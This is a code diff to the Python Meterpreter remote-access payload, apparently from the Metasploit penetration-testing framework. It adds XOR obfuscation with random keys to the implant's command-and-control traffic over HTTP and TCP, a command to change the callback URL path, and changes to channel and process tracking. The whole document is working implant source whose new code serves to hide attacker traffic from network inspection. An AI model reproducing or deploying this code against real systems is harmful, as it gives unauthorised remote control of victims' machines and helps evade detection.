@@ -5,6 +5,7 @@ import code
 import os
 import platform
 import random
+import re
 import select
 import socket
 import struct
@@ -57,6 +58,9 @@ else:
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
 	unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)
+
+# reseed the random generator.
+random.seed()
 
 #
 # Constants
@@ -174,6 +178,15 @@ TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 
 EXPORTED_SYMBOLS = {}
 EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
+
+def rand_byte():
+	return chr(random.randint(1, 255))
+
+def rand_xor_key():
+	return ''.join(rand_byte() for _ in range(4))
+
+def xor_bytes(key, data):
+	return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
 
 def export(symbol):
 	EXPORTED_SYMBOLS[symbol.__name__] = symbol
@@ -479,7 +492,9 @@ class Transport(object):
 	def send_packet(self, pkt):
 		self.request_retire = False
 		try:
-			self._send_packet(pkt)
+			xor_key = rand_xor_key()
+			raw = xor_key[::-1] + xor_bytes(xor_key, pkt)
+			self._send_packet(raw)
 		except:
 			return False
 		self.communication_last = time.time()
@@ -535,17 +550,20 @@ class HttpTransport(Transport):
 			self._first_packet = None
 			return packet
 		packet = None
-		request = urllib.Request(self.url, bytes('RECV', 'UTF-8'), self._http_request_headers)
+		xor_key = None
+		request = urllib.Request(self.url, None, self._http_request_headers)
 		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
 		packet = url_h.read()
 		for _ in range(1):
 			if packet == '':
 				break
-			if len(packet) < 8:
+			if len(packet) < 12:
 				packet = None  # looks corrupt
 				break
-			pkt_length, _ = struct.unpack('>II', packet[:8])
-			if len(packet) != pkt_length:
+			xor_key = packet[:4][::-1]
+			header = xor_bytes(xor_key, packet[4:12])
+			pkt_length, _ = struct.unpack('>II', header)
+			if len(packet) - 4 != pkt_length:
 				packet = None  # looks corrupt
 		if not packet:
 			delay = 10 * self._empty_cnt
@@ -555,12 +573,19 @@ class HttpTransport(Transport):
 			time.sleep(float(min(10000, delay)) / 1000)
 			return packet
 		self._empty_cnt = 0
-		return packet[8:]
+		return xor_bytes(xor_key, packet[12:])
 
 	def _send_packet(self, packet):
 		request = urllib.Request(self.url, packet, self._http_request_headers)
 		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
 		response = url_h.read()
+
+	def patch_uri_path(self, new_path):
+		match = re.match(r'https?://[^/]+(/.*$)', self.url)
+		if match is None:
+			return False
+		self.url = self.url[:match.span(1)[0]] + new_path
+		return True
 
 	def tlv_pack_transport_group(self):
 		trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
@@ -627,26 +652,31 @@ class TcpTransport(Transport):
 		self._first_packet = False
 		if not select.select([self.socket], [], [], 0.5)[0]:
 			return ''
-		packet = self.socket.recv(8)
+		packet = self.socket.recv(12)
 		if packet == '':  # remote is closed
 			self.request_retire = True
 			return None
-		if len(packet) != 8:
-			if first and len(packet) == 4:
+		if len(packet) != 12:
+			if first and len(packet) == 8:
 				received = 0
-				pkt_length = struct.unpack('>I', packet)[0]
+				xor_key = packet[:4][::-1]
+				header = xor_bytes(xor_key, packet[4:8])
+				pkt_length = struct.unpack('>I', header)[0]
 				self.socket.settimeout(max(self.communication_timeout, 30))
 				while received < pkt_length:
 					received += len(self.socket.recv(pkt_length - received))
 				self.socket.settimeout(None)
 				return self._get_packet()
 			return None
-		pkt_length, pkt_type = struct.unpack('>II', packet)
+
+		xor_key = packet[:4][::-1]
+		header = xor_bytes(xor_key, packet[4:12])
+		pkt_length, pkt_type = struct.unpack('>II', header)
 		pkt_length -= 8
 		packet = bytes()
 		while len(packet) < pkt_length:
 			packet += self.socket.recv(pkt_length - len(packet))
-		return packet
+		return xor_bytes(xor_key, packet)
 
 	def _send_packet(self, packet):
 		self.socket.send(packet)
@@ -668,8 +698,10 @@ class PythonMeterpreter(object):
 		self.last_registered_extension = None
 		self.extension_functions = {}
 		self.channels = {}
+		self.next_channel_id = 1
 		self.interact_channels = []
 		self.processes = {}
+		self.next_process_id = 1
 		self.transports = [self.transport]
 		self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
 		self.session_expiry_end = time.time() + self.session_expiry_time
@@ -696,17 +728,17 @@ class PythonMeterpreter(object):
 
 	def add_channel(self, channel):
 		assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
-		idx = 0
-		while idx in self.channels:
-			idx += 1
+		idx = self.next_channel_id
 		self.channels[idx] = channel
+		self.debug_print('[*] added channel id: ' + str(idx) + ' type: ' + channel.__class__.__name__)
+		self.next_channel_id += 1
 		return idx
 
 	def add_process(self, process):
-		idx = 0
-		while idx in self.processes:
-			idx += 1
+		idx = self.next_process_id
 		self.processes[idx] = process
+		self.debug_print('[*] added process id: ' + str(idx))
+		self.next_process_id += 1
 		return idx
 
 	def get_packet(self):
@@ -863,6 +895,14 @@ class PythonMeterpreter(object):
 		response += tlv_pack(TLV_TYPE_MACHINE_ID, "%s:%s" % (serial, machine_name))
 		return ERROR_SUCCESS, response
 
+	def _core_patch_url(self, request, response):
+		if not isinstance(self.transport, HttpTransport):
+			return ERROR_FAILURE, response
+		new_uri_path = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+		if not self.transport.patch_uri_path(new_uri_path):
+			return ERROR_FAILURE, response
+		return ERROR_SUCCESS, response
+
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
@@ -994,6 +1034,7 @@ class PythonMeterpreter(object):
 		del self.channels[channel_id]
 		if channel_id in self.interact_channels:
 			self.interact_channels.remove(channel_id)
+		self.debug_print('[*] closed and removed channel id: ' + str(channel_id))
 		return ERROR_SUCCESS, response
 
 	def _core_channel_eof(self, request, response):
@@ -1075,9 +1116,6 @@ class PythonMeterpreter(object):
 		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
 		resp += tlv_pack(method_tlv)
 
-		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
-		resp += tlv_pack(reqid_tlv)
-
 		handler_name = method_tlv['value']
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
@@ -1092,9 +1130,17 @@ class PythonMeterpreter(object):
 				if DEBUGGING:
 					traceback.print_exc(file=sys.stderr)
 				result = error_result()
+			else:
+				if result != ERROR_SUCCESS:
+					self.debug_print('[-] method ' + handler_name + ' resulted in error: #' + str(result))
 		else:
 			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
 			result = error_result(NotImplementedError)
+
+		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
+		if not reqid_tlv:
+			return
+		resp += tlv_pack(reqid_tlv)
 		return tlv_pack_response(result, resp)
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
@@ -1106,6 +1152,8 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if HTTP_CONNECTION_URL and has_urllib:
 		transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT)
 	else:
+		# PATCH-SETUP-STAGELESS-TCP-SOCKET #
 		transport = TcpTransport.from_socket(s)
 	met = PythonMeterpreter(transport)
+	# PATCH-SETUP-TRANSPORTS #
 	met.run()
